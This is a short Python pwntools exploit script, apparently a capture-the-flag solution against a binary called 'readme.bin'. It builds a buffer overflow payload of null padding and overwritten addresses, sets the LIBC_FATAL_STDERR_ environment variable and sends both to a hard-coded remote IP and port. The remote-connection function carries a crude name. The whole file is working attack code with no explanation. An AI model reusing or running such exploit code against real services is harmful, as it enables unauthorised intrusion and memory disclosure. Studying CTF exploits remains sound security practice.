#!/usr/bin/python

from pwn import *
info = log.info

# setting 
elf = ELF("readme.bin")

def local():
	global libc, r
	libc = ELF("local")
	r = remote("localhost", 5566)

def fuck():
	global libc, r
	#libc = ELF("libc.so.6")
	r = remote("136.243.194.62", 1024)

#local()
fuck()

#exp = "a"*540 + "b"*12 + p64(0x600d20)
exp = "\x00"*536 + p64(0x400d20) + p64(0) + p64(0x600d20)
r.sendline(exp)
r.sendline("LIBC_FATAL_STDERR_=gg")

r.interactive()

